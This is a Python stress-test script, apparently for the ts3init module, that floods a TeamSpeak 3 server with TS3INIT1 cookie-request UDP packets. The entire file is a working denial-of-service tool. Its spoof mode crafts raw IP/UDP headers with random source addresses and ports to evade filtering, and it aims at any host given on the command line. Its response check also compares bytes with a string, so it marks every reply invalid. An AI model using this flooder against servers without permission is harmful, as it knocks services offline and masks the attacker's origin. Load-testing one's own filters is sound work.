"""
Generates as fast as possible COMMAND_GET_COOKIE packets to see how well
the TeamSpeak 3 Server can withstand a simple DOS attack.

It has two modes:
* a testing mode that checks that the server continues to reply with correct
  messages, even when under heavy load.
* a spoofing mode, where answers are not expected or waited for, but the source
  ip and port are spoofed, in order to trick simple filtering.
"""
from socket import socket, getaddrinfo, IPPROTO_UDP, AF_INET, SOCK_RAW, IPPROTO_RAW, inet_aton
from argparse import ArgumentParser
from select import select
from random import randint
from itertools import repeat
from struct import pack, unpack_from
from time import time
from sys import version_info, exit

if version_info < (3,0):
    print('python3 required.')
    exit(1)

parser = ArgumentParser(description='Tests if the ts3init module, can withstand heavy loads.')
parser.add_argument('host', help='target host')
parser.add_argument('--port', type=int, default=9987, help='target port')
parser.add_argument('--count', type=int, default=100000, help='number of packets to send')
parser.add_argument('--response', type=int, default=1, help='what command number is expected to be returned from the server')
parser.add_argument('--spoof',  action='store_const', const=True, default=False, help='should the source address be spoofed')
parser.add_argument('--version',  type=int, default=1459504131, help='version number send to the server')
args = parser.parse_args()

CLIENT_VERSION_OFFSET = 1356998400

def generateSpoofedHeader(dest_address, dest_port, payload):
    # checksum functions needed for calculation checksum
    def checksum(msg):
        s = 0
        for i in range(0, len(msg), 2):
            w = msg[i+1] + (msg[i] << 8)
            s = s + w
        s = (s>>16) + (s & 0xffff);
        s = s + (s >> 16);
        s = ~s & 0xffff         
        return s
    
    source_address = randint(0, (1 << 32) - 1)
    source_port = randint(0, (1 << 16) - 1)
    udp_length = 8 + len(payload)
    udp_checksum = checksum(pack('!I4sxBHHHH2x',
        source_address , dest_address, IPPROTO_UDP, udp_length,
        source_port, dest_port, udp_length) + payload)
    if udp_checksum == 0:
        udp_checksum = (1 << 16) - 1
    
    return pack('!BBHHHBBHI4sHHHH',
        (4 << 4) + 5,   # Version, IHL
        0,              # TOS
        0,              # Total Length, kernel will fill the correct total length
        0,              # Identification
        0,              # Fragment Offset
        255,            # TTL
        IPPROTO_UDP,    # Protocol 
        0,              # Header checksum, kernel will fill the correct checksum
        source_address, # Source Address
        dest_address,   # Destination Address
        source_port,    # Source Port
        dest_port,      # Destination Port
        udp_length,     # UDP Length
        udp_checksum);  # UDP Checksum   
    
def generatePayload(version):
    number = randint(0, (1 << 32) - 1)
    return pack('!8sHHBIBII8x',
        b'TS3INIT1', # Literal
        101,         # Packet ID
        0,           # Client ID
        0x88,        # Flags,
        version - CLIENT_VERSION_OFFSET,     # Version
        0,           # Command
        int(time()), # Timestamp
        number);     # Random-Sequence
        
def validateResponse(answer, expectedCommand):
    (literal, packet_id, flags, command) = unpack_from('!8sHBB', answer)
    return (literal == 'TS3INIT1'
        and packet_id == 101
        and flags == 0x88
        and command == expectedCommand)
        
target = getaddrinfo(args.host, args.port, 0, 0, IPPROTO_UDP)[0]
print("Sending %i packets to %s:%i..." % (args.count, *target[4]))

if not args.spoof:
    send = 0
    sendErrors = 0
    recieved = 0
    invalid = 0
    sock = socket(*target[0:3])
    try:
        sock.connect(target[4])
        sock.setblocking(False)
        finished_writing = False
        while True:
            (canRead, canWrite, _) = select([sock.fileno()], [sock.fileno()] if not args.spoof and send < args.count else [] , [], 1)
            if canRead:
                data = sock.recv(128)
                if not validateResponse(data, args.response):
                   invalid += 1
                recieved += 1
            if canWrite:
                try:
                    packet = generatePayload(args.version)
                    sock.send(packet)
                    send += 1
                except:
                    sendErrors += 1                
            if not canRead and not canWrite:
                break
    finally:
        sock.close()
        print("send: %i(errors: %i); recieved: %i; invalid: %i" % (send, sendErrors, recieved, invalid))
else:
    send = 0
    sendErrors = 0
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)
    try:
        dest_address =  inet_aton(target[4][0])
        dest_port = target[4][1]
        
        for _ in repeat(None, args.count):
            try:
                payload = generatePayload(args.version)
                packet = generateSpoofedHeader(dest_address, dest_port, payload) + payload
                select([sock.fileno()], [] , [], 0)
                sock.sendto(packet, target[4])
                send += 1
            except BaseException as e:
                print(e)
                sendErrors += 1                
    finally:
        sock.close()
        print("send: %i(errors: %i);" % (send, sendErrors))
